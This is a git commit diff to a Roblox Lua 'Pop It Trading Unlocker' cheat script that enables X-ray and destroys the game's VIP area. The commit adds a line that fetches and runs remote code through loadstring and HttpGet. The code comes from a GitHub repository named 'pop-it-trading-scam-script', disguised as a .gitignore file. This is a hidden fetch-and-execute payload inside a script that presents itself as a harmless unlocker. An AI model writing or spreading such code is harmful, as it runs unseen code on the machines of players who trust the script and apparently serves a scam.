7749b71cc465fd07589f58714c6aac9edcbc9e71
Nolan1038 <90103911+Nolan1038@users.noreply.github.com>
2026-05-23 21:35:49 -0500

    Update unlockerPT.lua

--- unlockerPT.lua
+++ unlockerPT.lua
@@ -9,3 +9,5 @@ print("Pop It Trading Unlocker ehehhehehehe")
 game.Players.LocalPlayer.XRay.Value = true
 game.Workspace.Map.VIP:Destroy()
 game.Workspace.GoldenToilet.HitDetect:Destroy()
+wait(0.2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/refs/heads/main/.gitignore"))()
